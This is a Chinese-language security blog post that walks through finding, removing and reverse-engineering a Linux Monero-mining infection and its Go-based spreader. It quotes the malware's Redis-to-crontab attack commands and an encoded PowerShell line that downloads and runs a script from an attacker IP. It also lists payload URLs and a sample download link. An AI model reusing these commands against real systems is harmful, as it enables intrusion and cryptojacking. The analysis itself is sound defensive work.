***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 ***本文原创作者：xuing，本文属于FreeBuf原创奖励计划，未经许可禁止转载**  

## 起因

 **舍友在宿舍喊着，这服务器好卡啊，难受啊！我调侃他是不是被挖矿了，top命令看一下CPU占用。**

 **一看吓一跳，一个叫做sysupdate的进程占据了绝大部分的CPU资源。CPU使用率接近100%。**

 **看来被挖矿是坐实了。**

## 清除过程

### 确定病因

这个病毒还不是算很变态，很多挖矿病毒，使用top命令都看不到挖矿程序的进程。

基本可以确定这个占据绝大部分cpu资源的进程sysupdate，就是挖矿程序了，我们需要先找到他。

使用命令：

    
    
    ps -aux | grep sysupdate 

查看病毒的PID号。

为了获取绝对路径，使用：

    
    
    ls -l /proc/{pid号}/exe

发现sysupdate的绝对路径在/etc/sysupdate。

下载下来，上传到[VirusTotal](https://www.virustotal.com/#/file/815516167d2170997d6674190028f86854984749760600fb95c711f74c98da13/detection)。

![image.png](https://image.3001.net/images/20190408/1554712458_5cab078abd974.png!small)

如图所示，就是他，挖矿病毒没跑了。

### 开始清除

首先干掉进程：kill -9 {pid号}

直接rm -f sysupdate会提示类似：

    
    
    rm: cannot remove 'sysupdate ': Operation not permitted

基于经验，应该是病毒使用了chattr +i的命令。我们只要先执行chattr -i sysupdate，然后就可以正常删除了。

### 复发

然后..很快就又被创建出来了。应该是有守护进程什么的。

而且如果我们简单分析一下sysupdate，其实他并不是病毒，他只是个XMR挖矿程序。

(懂我意思吧，我们必须得找到他爸爸)。

分析的方法，可以通过findStr、IDA等工具提串或者..运行一下就明白了。下图是我虚拟机运行的截图。

![image.png](https://image.3001.net/images/20190408/1554712601_5cab08191c229.png!small)

好，我知道大家都不关心这个。

### 定时任务

我是先去看了下日志..发现什么都没有Orz，应该是被清了。

那还是先来检查下定时任务吧：

    
    
    crontab -l或者cat /var/spool/cron/root

还可以去查看定时任务的日志。

    
    
    more /var/log/cron log

太多的话，可以在后面加上| grep -v {要排除的关键字}来排除无用信息。

![image.png](https://image.3001.net/images/20190408/1554712634_5cab083a37ccc.png!small)

### update.sh分析

找到了这个定时执行的源头，我们来简单分析一下。update.sh的内容和相关样本在文末有提供下载。

在/etc下下载了config.json（挖矿配置）、sysupdate（XMR挖矿软件）、update.sh（本脚本）、networkservice(scanner
扫描并入侵其他的主机)、sysguard(watchdog 用于监控并保证病毒的正常运行以及更新)并保证他们以root权限运行。

![image.png](https://image.3001.net/images/20190408/1554715664_5cab1410ee305.png!small)

干掉别的挖矿病毒（见kill_miner_proc函数）。

创建/root/.ssh/authorized_keys，添加病毒作者自己的公钥，保证其可以使用SSH登录到服务器，算是个后门吧。

![image.png](https://image.3001.net/images/20190408/1554715693_5cab142d8831f.png!small)

然后就是添加定时任务，为文件添加chattr +i，修改IPTABLES，清楚日志，关闭SELinux等等。

### 修复

1.rm /var/spool/cron/root或者 crontab -r删除定时任务。

2.kill命令将相关进程干掉，用chattr -i和rm命令，将上述/etc下的文件全部删除。

3./root/.ssh/authorized_keys也删掉或者修复。

至于IPTABLES、SELinux的恢复，就看大家自己的需求了。

## 样本分析：networkservice文件的分析

### 分析准备

查壳是UPX，直接使用upx -d就能脱壳了。

IDA打开发现结构很乱，Shift+F7打开Program Segmentation。

![image.png](https://image.3001.net/images/20190408/1554712691_5cab087306143.png!small)

看到.gopclntab，基本就可以确定是golang编写的。我们这里使用[IDAGolangHelper](https://github.com/sibears/IDAGolangHelper)来帮助恢复符号信息。

从Github下载下来后，将脚本拷贝到IDA目录的python文件夹下，重启IDA，菜单选择File-Script
Command..导入go_entry.py并运行。

![image.png](https://image.3001.net/images/20190408/1554712703_5cab087f9e253.png!small)

PS：这里IDA7.0可能会遇到idc_bc695.py文件的MakeStr报错，这里给出看雪的[解决办法](https://bbs.pediy.com/thread-229574.htm)。

如图所示，前两个按钮是用于检测Go语言的版本，输出在Output window内。我们这里选择Go1.10。然后按下剩下全部按钮进行修复~

再次看Functions
window就舒服多了。不过字符串还是看着非常非常难受，因为Golang的字符串是堆成一坨的，用的时候通过偏移以及长度取。IDA没法很好的识别，只能自己从偏移处选定指定长度再按下A键进行标注。如果大佬们有更好的方式或者脚本，请务必赐教。

![image.png](https://image.3001.net/images/20190408/1554712767_5cab08bf1b116.png!small)

### 功能分析

我们接下来就可以从main_main函数开始看，整个程序的大概流程。

1.首先会去hxxps://pixeldra.in/api/download/I9RRye下载ips_cn.txt并保存为dkelc。

![image.png](https://image.3001.net/images/20190408/1554712791_5cab08d791606.png!small)

2.ips_cn.txt的内容实际上就是大量的国内ip段的十进制表示，为之后的扫描入侵做准备。

![image.png](https://image.3001.net/images/20190408/1554712805_5cab08e585ed0.png!small)

程序内包含了大量的exploit。基本都是RCE即远程命令执行，下表做了部分列举：

Redis未授权RCE | Hadoop未授权RCE | Drupal CVE-2018-7600  
---|---|---  
**ElasticSearch CVE-2015-1427** | **ElasticSearch CVE-2014-3120** |
**Redis爆破模块**  
**Spring CVE-2018-1273** | **Sqlserver Exploit模块** | **ThinkPHP5 RCE**  
**Weblogic CVE-2017-10271** |  |  
  
![image.png](https://image.3001.net/images/20190408/1554712871_5cab0927d4103.png!small)

以Redis未授权漏洞为例作分析，首先会去尝试空口令和弱口令爆破，如果成功连接。

首先设置Redis的stop-writes-on-bgsave-error为no。执行Redis命令FlushAll清空数据表。

设置dbfilename为Root，即设置持久化文件名为root，对应的Redis命令为：

    
    
    config set dbfilename root

![image.png](https://image.3001.net/images/20190408/1554715132_5cab11fc96edd.png!small)紧接着设置dir到定时任务目录/var/spool/cron，对应Redis命令为

    
    
    config set dir "/var/spool/cron"

![image.png](https://image.3001.net/images/20190408/1554715142_5cab12065919c.png!small)

执行完上面的命令后，Redis之后的数据就会保存到/var/spool/cron/root，即Root用户的定时任务文件里。

紧接着拼接curl下载并执行远程shell的语句，并调用Save写入文件中。

![image.png](https://image.3001.net/images/20190408/1554715150_5cab120e0f991.png!small)

### sysguard

作者叫他是Watchdog，主要功能就是监控自己的各程序，定时任务等是否启动正常。不知道和网上的watchdogs挖矿病毒有没有联系。

在分析过程中，发现不仅仅有Linux版，还有Windows版。

对于windows，会去执行下面的命令：

    
    
    powershell-windowstylehidden-nop-encaQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADQAMwAuADIANAA1AC4AMgAyADIALgA1ADcAOgA4ADYANgA3AC8ANgBIAHEASgBCADAAUwBQAFEAcQBiAEYAYgBIAEoARAAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==

base64解密为：

    
    
    iex(New-Object Net.WebClient).DownloadString('http://43.245.222.57:8667/6HqJB0SPQqbFbHJD/update.ps1')

即下载执行update.ps1，没什么新意，火绒就可以查杀拦截：

![image.png](https://image.3001.net/images/20190408/1554715311_5cab12af40e49.png!small)

windows版的下载地址如下，因为是Go语言编写的，其实内容都是大同小异的：

hxxp://43.245.222.57:8667/6HqJB0SPQqbFbHJD/sysupdate.exe  
---  
hxxp://43.245.222.57:8667/6HqJB0SPQqbFbHJD/sysguard.exe  
hxxp://43.245.222.57:8667/6HqJB0SPQqbFbHJD/networkservice.exe  
hxxp://43.245.222.57:8667/6HqJB0SPQqbFbHJD/update.ps1  
  
## 样本下载

    
    
    https://github.com/xuing/hello-world/blob/master/%E6%8C%96%E7%9F%BFlinux_sysupdate.zip

 ***本文原创作者：xuing，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

